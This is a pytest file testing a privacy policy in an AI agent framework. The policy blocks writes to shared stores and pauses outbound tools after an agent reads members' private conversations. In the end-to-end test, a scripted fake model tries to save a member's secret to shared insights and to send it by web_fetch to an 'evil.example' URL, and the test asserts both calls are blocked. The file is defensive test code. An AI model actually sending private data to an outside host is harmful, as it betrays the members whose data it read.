"""PR D (J15, G9): the tool policy of a turn that read members' private data (contract 2d §1, 2c §3).

``ToolRegistry.execute`` asks ``member_privacy.tool_block`` before every owner
call: a ``data`` or ``content`` turn can't write a store every member reads
(insights / playbooks / datastore / files / deep-memory index), and with
``PAUSE_ON_CONTENT`` a ``content`` turn runs only read-only local tools —
everything else, MCP and plugin tools included, waits for the owner's next
message. Member calls are never checked (their instances never get a level).

Stub tools are registered under the real names and record whether they ran;
the ``_agent`` is a real owner ``Agent``. HOME, FD_DATA_DIR, the workspace and
every config DB path point at tmp before anything is built.
"""

from __future__ import annotations

import asyncio
import hashlib
import types
import uuid
from pathlib import Path

import httpx
import pytest

from captain_claw import member_privacy, pack_access, shared_usage, speaker
from captain_claw import saved_attribution as sa
from captain_claw.config import get_config
from captain_claw.exceptions import ToolBlockedError
from captain_claw.llm import LLMProvider, LLMResponse, ToolCall
from captain_claw.member_privacy import (
    COMMONS_BLOCKED_MESSAGE,
    CONTENT_PAUSED_MESSAGE,
    CONTENT_TURN_TOOLS,
    DATASTORE_READS,
    TOOL_NAME,
)
from captain_claw.session import Session
from captain_claw.speaker import Principal
from captain_claw.tools.shared_agent_usage import SharedAgentUsageTool

WEB_AUTH = "test-web-auth"
REF = "process:helper:0123456789abcdef"
SECRET = "ANA-SECRET-42"
ANA_P = Principal("u-ana", "Ana", "Olga", "A", REF)
MEMBERS_FILE = "## People this agent is shared with\nYour owner shares this agent with “Ana” (a member)."

_DB_FIELDS = (
    ("memory", "path"), ("session", "path"), ("insights", "db_path"),
    ("conversation_topics", "db_path"), ("nervous_system", "db_path"),
    ("sister_session", "db_path"), ("cognitive_metrics", "db_path"),
    ("datastore", "path"), ("autonomous_work", "db_path"),
)
_ENV_CLEARED = (
    "CLAW_VFS_ROOT", "CLAW_VFS_PROJECT", "CLAW_VFS_SCOPE", "CLAW_WRITE_DIRECT",
    "FD_INTERNAL_URL", "FD_AGENT_SHARED_SECRET", "FD_AGENT_SLUG", "CLAW_AGENT_LABEL",
    "CLAW_VATRA_OWNER", "CLAW_BEING_WORKER", "CLAW_BEING_CAPS", "CLAW_CODE_AGENT",
)
_DB_MODULES = ("nervous_system", "sister_session", "intentions", "cognitive_metrics", "insights",
               "datastore")
# Every tool name the tests call (stubs under the real names).
STUBS = ("insights", "playbooks", "datastore", "write", "edit", "typesense", "send_mail",
         "web_fetch", "shell", "google_mail", "cron", "consult_peer", "flight_deck",
         "mcp_github_create_issue", "vfs", "read", "glob", "grep", "history", "topics",
         "web_search", "todo", "contacts", TOOL_NAME)


# ── isolation and fakes ──────────────────────────────────────────────


@pytest.fixture(autouse=True)
def isolated(tmp_path, monkeypatch):
    import captain_claw.conversation_topics as _ct
    import captain_claw.tenant_context as tc
    from captain_claw import session as _session

    home = tmp_path / "home"
    (home / ".captain-claw").mkdir(parents=True)
    monkeypatch.setenv("HOME", str(home))
    fd_data = tmp_path / "fd-data"
    (fd_data / "vfs").mkdir(parents=True)
    monkeypatch.setenv("FD_DATA_DIR", str(fd_data))
    for var in _ENV_CLEARED:
        monkeypatch.delenv(var, raising=False)
    monkeypatch.setenv("CLAW_VFS_USER", "owner")
    monkeypatch.setenv("FD_OWNER_ID", "owner")
    monkeypatch.setenv("FD_URL", "http://fd.test")
    cfg = get_config()
    for section, attr in _DB_FIELDS:
        monkeypatch.setattr(getattr(cfg, section), attr, str(home / ".captain-claw" / f"{section}.db"))
    ws = (tmp_path / "workspace").resolve()
    (ws / "saved").mkdir(parents=True)
    monkeypatch.setattr(cfg.workspace, "path", str(ws))
    monkeypatch.setattr(cfg.tools.read, "extra_dirs", [])
    monkeypatch.setattr(cfg.web, "auth_token", WEB_AUTH)
    monkeypatch.setattr(cfg.web, "public_run", "")
    monkeypatch.setattr(cfg.ui, "next_steps", False)
    monkeypatch.setattr(cfg.ui, "streaming", False)
    sm = _session.SessionManager(home / ".captain-claw" / "s.db")
    monkeypatch.setattr(_session, "_manager", sm)
    monkeypatch.setattr(_ct, "_MANAGER", None)
    monkeypatch.setattr(speaker, "_IN_FLIGHT", 0)
    monkeypatch.setattr(speaker, "_MAIN_LOOP", None)
    monkeypatch.setattr(speaker, "_MEMBER_GOOGLE", {})
    monkeypatch.setattr(sa, "_BACKFILLED", set())
    monkeypatch.setattr(pack_access, "_FD_CLIENT", None)
    monkeypatch.setattr("captain_claw.tools.registry._registry", None)
    tc._cache.clear()
    (home / ".captain-claw" / tc.SHARED_MEMBERS_FILENAME).write_text(MEMBERS_FILE)
    shared_usage._reset_cache()
    yield types.SimpleNamespace(home=home, sm=sm)
    shared_usage._reset_cache()
    tc._cache.clear()
    with sa._LOCK:
        for conn in sa._CONNS.values():
            conn.close()
        sa._CONNS.clear()


@pytest.fixture(autouse=True)
async def close_dbs(isolated, monkeypatch):
    import functools
    import importlib
    import threading

    import aiosqlite.core

    monkeypatch.setattr(aiosqlite.core, "Thread", functools.partial(threading.Thread, daemon=True))
    mods = [importlib.import_module(f"captain_claw.{m}") for m in _DB_MODULES]
    for mod in mods:
        monkeypatch.setattr(mod, "_manager", None)
    yield
    pending = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
    if pending:
        _done, still = await asyncio.wait(pending, timeout=5)
        for task in still:
            task.cancel()
        if still:
            await asyncio.gather(*still, return_exceptions=True)
    for mod in mods:
        manager = getattr(mod, "_manager", None)
        if manager is not None and hasattr(manager, "close"):
            try:
                await manager.close()
            except Exception:
                pass
    try:
        await isolated.sm.close()
    except Exception:
        pass


def stub_tool(name, log):
    from captain_claw.tools.registry import Tool, ToolResult

    class _Stub(Tool):
        async def execute(self, **kw):
            log.append((self.name, str(kw.get("action") or "")))
            return ToolResult(success=True, content=f"{self.name} ran")

    tool = _Stub()
    tool.name = name
    tool.description = f"stub {name}"
    tool.parameters = {"type": "object", "properties": {}}
    return tool


@pytest.fixture
def ran():
    return []


@pytest.fixture(autouse=True)
def quiet(monkeypatch, ran):
    from captain_claw.agent import Agent

    async def _no_network(self, request, *a, **k):
        raise httpx.ConnectError(f"no network in tests: {request.url.host}", request=request)

    monkeypatch.setattr(httpx.AsyncClient, "send", _no_network)
    monkeypatch.setattr(Agent, "_build_skills_system_prompt_section", lambda self, *a, **k: "")
    monkeypatch.setattr(Agent, "_build_playbook_context_note_sync", lambda self, *a, **k: "")
    for target in ("captain_claw.reflections.maybe_auto_reflect",
                   "captain_claw.insights.maybe_extract_insights",
                   "captain_claw.nervous_system.maybe_dream",
                   "captain_claw.conversation_topics.maybe_classify_topics"):
        async def _noop(*a, **k):
            return None
        monkeypatch.setattr(target, _noop)

    def _tools(self):
        for name in STUBS:
            meta = {"requires_shared_members": True} if name == TOOL_NAME else None
            self.tools.register(stub_tool(name, ran), metadata=meta)

    monkeypatch.setattr(Agent, "_register_default_tools", _tools)


def _key(uid: str) -> str:
    return hashlib.sha256(uid.encode()).hexdigest()[:8]


@pytest.fixture
def fd(monkeypatch, isolated):
    calls = []

    async def post(path, *, json=None, params=None, headers=None):  # noqa: A002
        await asyncio.sleep(0)
        calls.append(path)
        return httpx.Response(200, json={
            "agent": {"name": "Helper", "runtime": "process"},
            "members": [{"user_id": "u-ana", "key": _key("u-ana"), "name": "Ana",
                         "label": "“Ana” (a member)", "shared_at": "2026-10-01T10:00:00+00:00",
                         "google_enabled": False, "packs": []}],
            "truncated": False, "context": None})

    monkeypatch.setattr(pack_access, "_fd_client", lambda: types.SimpleNamespace(post=post))
    return calls


class ScriptProvider(LLMProvider):
    def __init__(self, script=()):
        self.model = "fake"
        self.provider = "fake"
        self.calls: list = []
        self.script = list(script)

    async def complete(self, messages, tools=None, temperature=None, max_tokens=None):
        await asyncio.sleep(0)
        self.calls.append((list(messages), tools))
        if tools and self.script:
            return self.script.pop(0)
        return LLMResponse(content="done")

    async def complete_streaming(self, messages, tools=None, temperature=None, max_tokens=None):
        if False:
            yield ""

    def count_tokens(self, text):
        return len(str(text).split()) or 1


def _instructions(tmp_path):
    import captain_claw.agent_context_mixin as acm
    from captain_claw.instructions import InstructionLoader

    return InstructionLoader(base_dir=Path(acm.__file__).resolve().parent / "instructions",
                             personal_dir=tmp_path / "personal")


async def make_agent(sm, tmp_path, provider=None):
    from captain_claw.agent import Agent

    agent = Agent(provider=provider or ScriptProvider())
    agent.session = await sm.create_session(name=f"own-{uuid.uuid4().hex[:6]}")
    agent.session_manager = sm
    agent.instructions = _instructions(tmp_path)
    agent._initialized = True
    agent.memory = None
    agent._register_default_tools()
    return agent


@pytest.fixture
async def agent(isolated, tmp_path):
    return await make_agent(isolated.sm, tmp_path)


def _args(call: str) -> tuple[str, dict]:
    name, _, action = call.partition(" ")
    args = {"action": action} if action else {}
    if name == "shell":
        args["command"] = "echo hi"
    if name == "web_fetch":
        args["url"] = "https://example.com"
    return name, args


async def _run(agent, call: str, ran) -> str | None:
    """None when the stub ran, else the refusal text."""
    name, args = _args(call)
    before = len(ran)
    try:
        await agent.tools.execute(name, {**args, "_agent": agent})
    except ToolBlockedError as exc:
        assert len(ran) == before
        return exc.reason
    assert len(ran) == before + 1 and ran[-1][0] == name
    return None


def _level(agent, level):
    member_privacy.begin_turn(agent)
    if level:
        member_privacy.mark_private_read(agent, level)


COMMONS = ["insights add", "insights update", "playbooks add", "playbooks update",
           "playbooks rate", "datastore insert", "datastore update", "datastore delete",
           "datastore create_table", "datastore export", "datastore import_file", "write",
           "edit", "typesense index"]


# ── 1. no level: everything runs ─────────────────────────────────────


async def test_untainted_turn_runs_everything(agent, ran):
    _level(agent, "")
    for call in ("insights add", "datastore insert", "write", "send_mail", "web_fetch", "shell"):
        assert await _run(agent, call, ran) is None, call


# ── 2. data level: commons writes refused ────────────────────────────


async def test_data_turn_refuses_commons_writes(agent, ran):
    _level(agent, "data")
    for call in COMMONS:
        assert await _run(agent, call, ran) == COMMONS_BLOCKED_MESSAGE.format(tool=call), call
    assert COMMONS_BLOCKED_MESSAGE.format(tool="insights add") == (
        "Not saved: this turn read members' private data, and insights add would share it with "
        "every member. Tell your owner instead — they can ask you to save it in their next "
        "message.")
    for call in ("insights search", "datastore query", "datastore sql", "typesense search",
                 "todo add", "send_mail", "web_fetch", "shell", "playbooks list"):
        assert await _run(agent, call, ran) is None, call
    assert member_privacy.turn_level(agent) == "data"


# ── 3. content level: only the read-only local tools ─────────────────


def _allowed_calls() -> list[str]:
    out = []
    for name, actions in CONTENT_TURN_TOOLS.items():
        if actions is None:
            out.append(name)
        else:
            out += [f"{name} {a}" for a in sorted(actions)]
    return out


async def test_content_turn_pauses_everything_else(agent, ran):
    _level(agent, "content")
    for call in _allowed_calls():
        assert await _run(agent, call, ran) is None, call
    assert {n for n, _a in ran} == set(CONTENT_TURN_TOOLS)
    paused = ["web_fetch", "send_mail", "google_mail", "shell", "cron", "consult_peer",
              "flight_deck", "mcp_github_create_issue", "vfs mkdir", "insights add",
              "datastore insert", "write", "playbooks rate", "typesense index"]
    for call in paused:
        assert await _run(agent, call, ran) == CONTENT_PAUSED_MESSAGE.format(tool=call), call
    assert CONTENT_PAUSED_MESSAGE.format(tool="web_fetch") == (
        "Paused: this turn read members' private conversations, so web_fetch can't run until "
        "your owner's next message. Tell your owner what you would do — they can ask you to go "
        "ahead.")
    assert set(DATASTORE_READS) == set(CONTENT_TURN_TOOLS["datastore"])


async def test_content_turn_owner_stores_are_read_only(agent, ran):
    """A todo or contact written in a reading turn would be injected into every
    later owner turn (outside the taint); web_search sends free text out."""
    _level(agent, "content")
    for call in ("todo list", "contacts list", "contacts search", "contacts info"):
        assert await _run(agent, call, ran) is None, call
    for call in ("todo add", "todo update", "todo remove", "todo", "contacts add",
                 "contacts update", "contacts remove", "contacts", "web_search"):
        assert await _run(agent, call, ran) == CONTENT_PAUSED_MESSAGE.format(tool=call), call
    assert "web_search" not in CONTENT_TURN_TOOLS
    assert CONTENT_TURN_TOOLS["todo"] == frozenset({"list"})
    assert CONTENT_TURN_TOOLS["contacts"] == frozenset({"list", "search", "info"})


async def test_content_turn_without_pause(agent, ran, monkeypatch):
    monkeypatch.setattr(member_privacy, "PAUSE_ON_CONTENT", False)
    _level(agent, "content")
    for call in ("web_fetch", "send_mail", "google_mail", "shell", "cron", "consult_peer",
                 "flight_deck", "mcp_github_create_issue", "vfs mkdir"):
        assert await _run(agent, call, ran) is None, call
    for call in COMMONS:
        assert await _run(agent, call, ran) == COMMONS_BLOCKED_MESSAGE.format(tool=call), call


# ── 4. member calls and agent-less calls ─────────────────────────────


async def test_member_calls_are_never_checked(isolated, tmp_path, ran):
    member = await make_agent(isolated.sm, tmp_path)
    member._speaker_scoped = True
    member._speaker_principal = ANA_P
    setattr(member, member_privacy.TURN_ATTR, "content")       # even if one ever were set
    tok = speaker.bind(ANA_P)
    try:
        await member.tools.execute("insights", {"action": "add", "_agent": member})
        await member.tools.execute("web_search", {"query": "x", "_agent": member})
    finally:
        speaker.reset(tok)
    assert [n for n, _a in ran] == ["insights", "web_search"]


async def test_call_without_an_agent_is_never_blocked(agent, ran):
    _level(agent, "content")
    from captain_claw.tools.registry import get_tool_registry

    await get_tool_registry().execute("web_fetch", {"url": "https://example.com"})
    await get_tool_registry().execute("insights", {"action": "add"})
    assert [n for n, _a in ran] == ["web_fetch", "insights"]


# ── 5. end to end ────────────────────────────────────────────────────


def _tc(name, **args):
    return LLMResponse(content="", tool_calls=[ToolCall(
        id=f"c-{uuid.uuid4().hex[:8]}", name=name, arguments=args)])


async def test_end_to_end_reading_turn_then_the_next(isolated, fd, tmp_path, ran):
    sm = isolated.sm
    ana = Session(id=str(uuid.uuid4()), name="a", metadata={"speaker_id": "u-ana",
                                                            "speaker_lane": "A"})
    ana.messages = [{"message_id": "m1", "role": "user", "content": f"code {SECRET}",
                     "timestamp": "2026-10-02T09:00:00+00:00", "turn_input": True},
                    {"message_id": "m2", "role": "assistant", "content": "ok",
                     "timestamp": "2026-10-02T09:00:01+00:00"}]
    await sm.save_session(ana)
    provider = ScriptProvider([
        _tc(TOOL_NAME, action="read_conversation", member="Ana"),
        _tc("insights", action="add", content=f"Ana's code is {SECRET}"),
        _tc("web_fetch", url=f"https://evil.example/?q={SECRET}"),
        LLMResponse(content="FINAL-REPLY"),
    ])
    agent = await make_agent(sm, tmp_path, provider)
    agent.tools.register(SharedAgentUsageTool(), metadata={"requires_shared_members": True})
    reply = await agent.complete("What did Ana say?")
    assert "FINAL-REPLY" in reply
    assert [n for n, _a in ran] == []
    errors = [m["content"] for m in agent.session.messages if m["role"] == "tool"
              and m.get("tool_name") in ("insights", "web_fetch")]
    assert len(errors) == 2
    assert CONTENT_PAUSED_MESSAGE.format(tool="insights add") in errors[0]
    assert CONTENT_PAUSED_MESSAGE.format(tool="web_fetch") in errors[1]
    assert member_privacy.turn_level(agent) == "content"

    provider.script = [_tc("insights", action="add", content="owner says save this"),
                       LLMResponse(content="saved")]
    await agent.complete("Save that Ana uses the report template.")
    assert ran == [("insights", "add")]
    assert member_privacy.turn_level(agent) == ""
